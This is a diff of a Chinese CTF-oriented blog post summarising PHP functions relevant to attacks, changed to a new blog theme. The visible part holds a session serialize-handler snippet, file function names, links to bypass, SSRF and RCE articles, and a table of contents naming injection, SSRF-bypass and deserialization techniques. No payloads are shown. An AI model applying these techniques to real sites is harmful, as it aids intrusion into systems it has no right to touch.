+<h2 id="配置函数"><a href="#配置函数" class="headerlink" title="配置函数"></a>配置函数</h2><h3 id="session"><a href="#session" class="headerlink" title="session"></a>session</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ini_set(&#39;session.serialize_handler&#39;, &#39;需要设置的引擎&#39;);</span><br><span class="line">session_start(&#39;serialize_handler&#x3D;需要设置的引擎&#39;)</span><br></pre></td></tr></table></figure>
+
+
+
 
 <h2 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h2><p>readfile()</p>
 <p>file_get_contents</p>
 <p>file_put_contents</p>
 <p>dirname</p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p> <a href="https://www.fuzzer.xyz/2019/03/07/CTF命令执行及绕过技巧/" target="_blank" rel="noopener">https://www.fuzzer.xyz/2019/03/07/CTF%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%8F%8A%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/</a> </p>
-<p> <a href="http://j0k3r.top/2019/01/30/SSRF/#0x01-IP进制转换" target="_blank" rel="noopener">http://j0k3r.top/2019/01/30/SSRF/#0x01-IP%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2</a> </p>
-<p> <a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/" target="_blank" rel="noopener">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a> </p>
-<p> <a href="https://www.smi1e.top/通过一道审计题了解ssrf/" target="_blank" rel="noopener">https://www.smi1e.top/%E9%80%9A%E8%BF%87%E4%B8%80%E9%81%93%E5%AE%A1%E8%AE%A1%E9%A2%98%E4%BA%86%E8%A7%A3ssrf/</a> </p>
-
-            
-
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p> <a class="link" target="_blank" rel="noopener" href="https://www.fuzzer.xyz/2019/03/07/CTF命令执行及绕过技巧/">https://www.fuzzer.xyz/2019/03/07/CTF%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%8F%8A%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/<i class="fas fa-external-link-alt"></i></a> </p>
+<p> <a class="link" target="_blank" rel="noopener" href="http://j0k3r.top/2019/01/30/SSRF/#0x01-IP进制转换">http://j0k3r.top/2019/01/30/SSRF/#0x01-IP%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2<i class="fas fa-external-link-alt"></i></a> </p>
+<p> <a class="link" target="_blank" rel="noopener" href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/<i class="fas fa-external-link-alt"></i></a> </p>
+<p> <a class="link" target="_blank" rel="noopener" href="https://www.smi1e.top/通过一道审计题了解ssrf/">https://www.smi1e.top/%E9%80%9A%E8%BF%87%E4%B8%80%E9%81%93%E5%AE%A1%E8%AE%A1%E9%A2%98%E4%BA%86%E8%A7%A3ssrf/<i class="fas fa-external-link-alt"></i></a> </p>
 
         </div>
-    </div>
-    <div id="post-footer" class="post-footer main-content-wrap">
+
         
-        
-            <div class="post-actions-wrap">
-    <nav>
-        <ul class="post-actions post-action-nav">
-            <li class="post-action">
-                
-                    
-                <a
-                    class="post-action-btn btn btn--default tooltip--top"
-                    href="/2019/10/15/流量分析/"
-                    data-tooltip="流量分析"
-                    aria-label="上一篇: 流量分析"
-                >
-                    
-                        <i class="fa fa-angle-left" aria-hidden="true"></i>
-                        <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
-                    </a>
-            </li>
-            <li class="post-action">
-                
-                    
-                <a
-                    class="post-action-btn btn btn--default tooltip--top"
-                    href="/2019/10/10/jsonp/"
-                    data-tooltip="jsonp"
-                    aria-label="下一篇: jsonp"
-                >
-                    
-                        <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
-                        <i class="fa fa-angle-right" aria-hidden="true"></i>
-                    </a>
-            </li>
-        </ul>
-    </nav>
-    <ul class="post-actions post-action-share">
-        <li class="post-action hide-lg hide-md hide-sm">
-            <a
-                class="post-action-btn btn btn--default btn-open-shareoptions"
-                href="#btn-open-shareoptions"
-                aria-label="Diesen Beitrag teilen"
-            >
-                <i class="fa fa-share-alt" aria-hidden="true"></i>
-            </a>
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>Post title：php函数总结</li>
+        <li>Post author：p1k</li>
+        <li>Create time：2019-10-13 08:42:43</li>
+        <li>
+            Post link：http://p1keman.github.io/2019/10/13/php函数总结/
         </li>
-        
-            
-            
-            <li class="post-action hide-xs">
-                <a
-                    class="post-action-btn btn btn--default"
-                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://p1keman.github.io/2019/10/13/php函数总结/"
-                    title="分享到 Facebook"
-                    aria-label="分享到 Facebook"
-                >
-                    <i class="fab fa-facebook" aria-hidden="true"></i>
-                </a>
-            </li>
-        
-            
-            
-            <li class="post-action hide-xs">
-                <a
-                    class="post-action-btn btn btn--default"
-                    target="new" href="https://twitter.com/intent/tweet?text=http://p1keman.github.io/2019/10/13/php函数总结/"
-                    title="分享到 Twitter"
-                    aria-label="分享到 Twitter"
-                >
-                    <i class="fab fa-twitter" aria-hidden="true"></i>
-                </a>
-            </li>
-        
-            
-            
-            <li class="post-action hide-xs">
-                <a
-                    class="post-action-btn btn btn--default"
-                    target="new" href="https://plus.google.com/share?url=http://p1keman.github.io/2019/10/13/php函数总结/"
-                    title="分享到 Google+"
-                    aria-label="分享到 Google+"
-                >
-                    <i class="fab fa-google-plus" aria-hidden="true"></i>
-                </a>
-            </li>
-        
-        
-            
-        
-        <li class="post-action">
-            
-                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
-            
-                <i class="fa fa-list" aria-hidden="true"></i>
-            </a>
+        <li>
+            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
         </li>
     </ul>
 </div>
 
+            </div>
+        
 
         
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2019/10/15/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">流量分析</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2019/10/10/jsonp/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">jsonp</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
         
-            
+
         
     </div>
-</article>
+</div>
 
 
+                
+            </div>
 
-                <footer id="footer" class="main-content-wrap">
-    <span class="copyrights">
-        Copyrights &copy; 2020 John Doe. All Rights Reserved.
-    </span>
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2020</span> -
+            
+            2021 <i class="fas fa-heart icon-animate"></i> <a href="/">p1k</a>
+        </div>
+        
+            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        Visitor Count <span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        Totalview <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a> | Theme <a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.3.1</a>
+        </div>
+    </div>
 </footer>
 
-            </div>
-            
-                <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
-                    <div class="post-actions-wrap">
-    <nav>
-        <ul class="post-actions post-action-nav">
-            <li class="post-action">
-                
-                    
-                <a
-                    class="post-action-btn btn btn--default tooltip--top"
-                    href="/2019/10/15/流量分析/"
-                    data-tooltip="流量分析"
-                    aria-label="上一篇: 流量分析"
-                >
-                    
-                        <i class="fa fa-angle-left" aria-hidden="true"></i>
-                        <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
-                    </a>
-            </li>
-            <li class="post-action">
-                
-                    
-                <a
-                    class="post-action-btn btn btn--default tooltip--top"
-                    href="/2019/10/10/jsonp/"
-                    data-tooltip="jsonp"
-                    aria-label="下一篇: jsonp"
-                >
-                    
-                        <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
-                        <i class="fa fa-angle-right" aria-hidden="true"></i>
-                    </a>
-            </li>
-        </ul>
-    </nav>
-    <ul class="post-actions post-action-share">
-        <li class="post-action hide-lg hide-md hide-sm">
-            <a
-                class="post-action-btn btn btn--default btn-open-shareoptions"
-                href="#btn-open-shareoptions"
-                aria-label="Diesen Beitrag teilen"
-            >
-                <i class="fa fa-share-alt" aria-hidden="true"></i>
-            </a>
-        </li>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
         
-            
-            
-            <li class="post-action hide-xs">
-                <a
-                    class="post-action-btn btn btn--default"
-                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://p1keman.github.io/2019/10/13/php函数总结/"
-                    title="分享到 Facebook"
-                    aria-label="分享到 Facebook"
-                >
-                    <i class="fab fa-facebook" aria-hidden="true"></i>
-                </a>
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
             </li>
         
-            
-            
-            <li class="post-action hide-xs">
-                <a
-                    class="post-action-btn btn btn--default"
-                    target="new" href="https://twitter.com/intent/tweet?text=http://p1keman.github.io/2019/10/13/php函数总结/"
-                    title="分享到 Twitter"
-                    aria-label="分享到 Twitter"
-                >
-                    <i class="fab fa-twitter" aria-hidden="true"></i>
-                </a>
-            </li>
+
+        <!-- go comment -->
         
-            
-            
-            <li class="post-action hide-xs">
-                <a
-                    class="post-action-btn btn btn--default"
-                    target="new" href="https://plus.google.com/share?url=http://p1keman.github.io/2019/10/13/php函数总结/"
-                    title="分享到 Google+"
-                    aria-label="分享到 Google+"
-                >
-                    <i class="fab fa-google-plus" aria-hidden="true"></i>
-                </a>
-            </li>
-        
-        
-            
-        
-        <li class="post-action">
-            
-                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
-            
-                <i class="fa fa-list" aria-hidden="true"></i>
-            </a>
-        </li>
     </ul>
 </div>
 
-
-                </div>
-                
-    <div id="share-options-bar" class="share-options-bar" data-behavior="4">
-        <i id="btn-close-shareoptions" class="fa fa-times"></i>
-        <ul class="share-options">
-            
-                
-                
-                <li class="share-option">
-                    <a
-                        class="share-option-btn"
-                        target="new"
-                        href="https://www.facebook.com/sharer/sharer.php?u=http://p1keman.github.io/2019/10/13/php函数总结/"
-                        aria-label="分享到 Facebook"
-                    >
-                        <i class="fab fa-facebook" aria-hidden="true"></i><span>分享到 Facebook</span>
-                    </a>
-                </li>
-            
-                
-                
-                <li class="share-option">
-                    <a
-                        class="share-option-btn"
-                        target="new"
-                        href="https://twitter.com/intent/tweet?text=http://p1keman.github.io/2019/10/13/php函数总结/"
-                        aria-label="分享到 Twitter"
-                    >
-                        <i class="fab fa-twitter" aria-hidden="true"></i><span>分享到 Twitter</span>
-                    </a>
-                </li>
-            
-                
-                
-                <li class="share-option">
-                    <a
-                        class="share-option-btn"
-                        target="new"
-                        href="https://plus.google.com/share?url=http://p1keman.github.io/2019/10/13/php函数总结/"
-                        aria-label="分享到 Google+"
-                    >
-                        <i class="fab fa-google-plus" aria-hidden="true"></i><span>分享到 Google+</span>
-                    </a>
-                </li>
-            
-        </ul>
-    </div>
-
-
-            
         </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
         
 
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
 
-<div id="about">
-    <div id="about-card">
-        <div id="about-btn-close">
-            <i class="fa fa-times"></i>
-        </div>
-        
-            <h4 id="about-card-name">John Doe</h4>
-        
-            <div id="about-card-bio"><p>author.bio</p>
-</div>
-        
-        
-            <div id="about-card-job">
-                <i class="fa fa-briefcase"></i>
-                <br/>
-                <p>author.job</p>
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
 
-            </div>
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
         
-        
-    </div>
+    </ul>
 </div>
 
-        
-        
-<div id="cover" style="background-image:url('/assets/images/cover.jpg');"></div>
-        <!--SCRIPTS-->
-<script src="/assets/js/script-hvks0tjho7hhxxjwgvjgerqzsheh4pu8sgih6uruqsx2fdeiyiflclfy2v4q.min.js"></script>
-<!--SCRIPTS END-->
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-text">命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#system"><span class="nav-text">system</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exec"><span class="nav-text">exec</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#shell-exec-gt"><span class="nav-text">shell_exec &#x3D;&#x3D;&gt;&#96;&#96;</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#pcntl-exec"><span class="nav-text">pcntl_exec</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#popen"><span class="nav-text">popen</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#proc-open"><span class="nav-text">proc_open</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#passthru"><span class="nav-text">passthru</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bypass"><span class="nav-text">bypass</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#OOB%E5%B8%A6%E5%A4%96"><span class="nav-text">OOB带外</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-text">编码绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B3%E9%94%AE%E5%AD%97%E7%9A%84%E7%BB%95%E8%BF%87"><span class="nav-text">关键字的绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8B%BC%E6%8E%A5%E7%BB%95%E8%BF%87"><span class="nav-text">拼接绕过</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="nav-text">代码执行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#eval"><span class="nav-text">eval</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#assert"><span class="nav-text">assert</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#preg-replace"><span class="nav-text">preg_replace</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#call-user-func"><span class="nav-text">call_user_func</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#call-user-func-array"><span class="nav-text">call_user_func_array</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#array-map"><span class="nav-text">array_map</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#array-filter"><span class="nav-text">array_filter</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#create-function"><span class="nav-text">create_function</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#no-1"><span class="nav-text">no.1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#no-2"><span class="nav-text">no.2</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ob-start"><span class="nav-text">ob_start</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#usort-uasort"><span class="nav-text">usort&#x2F;uasort</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XXE"><span class="nav-text">XXE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#DOMDocument"><span class="nav-text">DOMDocument</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SimpleXMLElement"><span class="nav-text">SimpleXMLElement</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#simplexml-load-string"><span class="nav-text">simplexml_load_string</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF"><span class="nav-text">SSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#curl-exec"><span class="nav-text">curl_exec</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#file-get-contents"><span class="nav-text">file_get_contents</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fsocksopen"><span class="nav-text">fsocksopen</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bypass-1"><span class="nav-text">bypass</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#IP%E8%BD%AC%E6%8D%A2"><span class="nav-text">IP转换</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#url%E7%BB%95%E8%BF%87"><span class="nav-text">url绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#filter-var"><span class="nav-text">filter_var</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#parse-url"><span class="nav-text">parse_url</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#no-1-%E9%81%87%E5%88%B0-%E4%BC%9A%E8%BF%94%E5%9B%9Eflase"><span class="nav-text">no.1 遇到&#x2F;&#x2F;&#x2F;会返回flase</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#no-2-%E9%81%87%E5%88%B0-%E6%8A%8Adata%E5%BD%93%E4%BD%9Cpath"><span class="nav-text">no.2 遇到&#x2F;&#x2F;把data当作path</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#no-3-%E9%81%87%E5%88%B0%E9%9D%9E%E6%B3%95%E5%AD%97%E7%AC%A6%E8%87%AA%E5%8A%A8%E8%BD%AC%E4%B8%BA%E4%B8%8B%E5%88%92%E7%BA%BF"><span class="nav-text">no.3 遇到非法字符自动转为下划线_</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#no-4-%E8%A7%A3%E6%9E%90host"><span class="nav-text">no.4 解析host</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#libcurl%E5%92%8Cparse-url%E7%9A%84%E8%A7%A3%E6%9E%90%E5%B7%AE%E5%BC%82"><span class="nav-text">libcurl和parse_url的解析差异</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#302%E8%B7%B3%E8%BD%AC"><span class="nav-text">302跳转</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95"><span class="nav-text">测试</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="nav-text">魔术方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phar"><span class="nav-text">phar</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#session%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">session中的反序列化</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="nav-text">变量覆盖</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#extract"><span class="nav-text">extract</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-text">$</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#parse-str"><span class="nav-text">parse_str</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E6%B3%A8%E5%86%8C"><span class="nav-text">全局变量注册</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#import-request-variables"><span class="nav-text">import_request_variables()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0"><span class="nav-text">无参数函数</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B6%85%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F-ENV"><span class="nav-text">超全局变量$_ENV</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#getallheaders"><span class="nav-text">getallheaders</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%85%8D%E7%BD%AE%E5%87%BD%E6%95%B0"><span class="nav-text">配置函数</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#session"><span class="nav-text">session</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6"><span class="nav-text">读写文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-text">参考链接</span></a></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
 
 
     
 
+</main>
 
 
 
-    </body>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+
+<div class="post-scripts">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+
+</body>
 </html>
